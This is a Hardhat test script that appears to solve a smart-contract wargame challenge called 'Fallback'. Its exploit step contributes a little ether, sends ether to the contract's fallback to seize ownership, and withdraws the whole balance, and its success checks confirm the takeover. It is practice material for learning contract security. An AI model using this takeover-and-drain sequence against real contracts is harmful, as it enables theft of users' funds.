const { ethers } = require('hardhat');
const { expect } = require('chai');

describe('[Challenge] Fallback', function () {

    let deployer, attacker;
    
    before(async () =>{
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        const network = await ethers.provider.getNetwork();
        const chainID = network.chainId
        
        if (chainID == 5){ // goerli testnet
            /** connect to Dapp in goerli **/
            [attacker] = await ethers.getSigners();
            const ContractFactory = await ethers.getContractFactory('Fallback');
            this.target = ContractFactory.attach("");
            
        } else { // local network - hardhat  
            /** local test **/
            [deployer, attacker] = await ethers.getSigners();
            const FallbackFactory = await ethers.getContractFactory('Fallback', deployer);
            this.target = await FallbackFactory.deploy();
        }
    });

    it('Exploit', async () => {
        /** CODE YOUR EXPLOIT HERE */
        const some_ether = ethers.utils.parseEther('0.0001', 'ether');
        // Contribute to get into whitelist
        console.log(`\t contributing...`);
        let conTx = await this.target.connect(attacker).contribute({value: some_ether});
        await conTx.wait();
        let contribute = await this.target.contributions(attacker.address);
        console.log(`\t attacker contribute for ${ethers.utils.formatEther(contribute)} ether`);
        // Takeover the contract's owner by sending some ethers
        console.log(`\t taking over owner...`);
        tx = {
            to: this.target.address,
            value: some_ether
        };
        let sendTx = await attacker.sendTransaction(tx);
        await sendTx.wait();
        let owner = await this.target.owner();
        console.log(`\t owner: ${owner}`);
        console.log(`\t attacker: ${attacker.address}`);
        // Withdraw all ethers in the contract
        console.log(`\t withdrawing...`);
        let withdrawTx = await this.target.connect(attacker).withdraw();
        await withdrawTx.wait();
    }).timeout(0);

    after(async () => {
        /** SUCCESS CONDITIONS */
        expect(await this.target.owner()).to.be.eq(attacker.address);
        let etherInContract = await ethers.provider.getBalance(this.target.address);
        expect(parseInt(etherInContract)).to.be.eq(0);
    });
});